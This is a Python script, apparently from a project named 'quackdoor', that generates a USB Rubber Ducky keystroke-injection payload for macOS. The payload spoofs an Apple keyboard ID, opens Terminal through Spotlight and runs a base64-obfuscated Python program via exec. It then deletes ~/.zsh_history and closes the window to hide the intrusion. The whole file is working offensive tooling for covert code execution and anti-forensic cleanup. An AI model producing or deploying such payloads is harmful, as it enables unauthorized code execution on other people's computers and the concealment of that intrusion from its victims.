''' 
hatch.py

author: mah5057

Creates ducky/{payload}.txt

Considerations:
    - depending on external dependencies, you might have
      to tweak PIP_TIME to allow enough time for the pip
      command to finish
'''

import base64
import subprocess

PAYLOAD_NAME = "payload.txt" # set custom payload name here
PIP_TIME = 5000              # time to wait after invoking pip (ms), only necessary for external dependencies
REQUIREMENTS = []            # add external dependencies required by eggsecutor/eggsecutor.py

PIP_LINE = f"STRING pip install {" ".join(REQUIREMENTS)}\nENTER\nDELAY {PIP_TIME}\n" if REQUIREMENTS else ""

def flatten_to_base64_exec(input_path):
    with open(input_path, "r") as f:
        code = f.read()

    b64 = base64.b64encode(code.encode()).decode()
    # Use single quotes on outside, double quotes inside — safe for zsh
    return f"python3 -c 'import base64; exec(base64.b64decode(\"{b64}\").decode())'"

flattened_b64 = flatten_to_base64_exec("quackdoor/eggsecutor/eggsecutor.py")

script_template = f"ID 05ac:021e Apple:Keyboard\nDELAY 300\nGUI SPACE\nDELAY 500\nSTRING terminal.app\nDELAY 1000\nENTER\nDELAY 1500\nSTRING cd ~\nENTER\nDELAY 1000\n{PIP_LINE}STRING {flattened_b64}\nENTER\nDELAY 2000\nSTRING clear\nENTER\nDELAY 1000\nSTRING rm ~/.zsh_history\nENTER\nDELAY 1000\nGUI q\nDELAY 250"

with open(f"quackdoor/hatchery/{PAYLOAD_NAME}", "w") as f:
    f.write(script_template)